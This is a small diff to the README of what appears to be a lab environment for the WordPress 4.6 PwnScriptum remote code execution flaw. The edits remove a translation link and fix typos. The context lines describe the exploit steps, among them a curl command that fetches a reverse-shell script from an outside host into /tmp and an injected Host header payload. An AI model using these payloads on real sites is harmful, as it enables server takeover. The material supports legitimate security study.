@@ -1,7 +1,5 @@
 # Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)
 
-[中文版本(Chinese version)](README.zh-cn.md)
-
 ## Reference link
 
 https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
@@ -42,7 +40,7 @@ In order to solve these problems, the vulnerability author came up with `${subst
 
 However, there are still a lot of characters can't be used. So we need to put the command on the third-party website, and then download it to `/tmp` directory by `curl -o /tmp/rce example.com/shell.sh`.
 
-Therefore, the expliot process is follows:
+Therefore, the exploit process is follows:
 
 - Write the exp of reverse shell and put it on a site. The exp have this following requirements:
   - the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.
@@ -52,7 +50,7 @@ Therefore, the expliot process is follows:
 - Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
 - Send these two packets in order.
 
-Here is [expliot.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
+Here is [exploit.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
 
 Execute to get the shell:
 
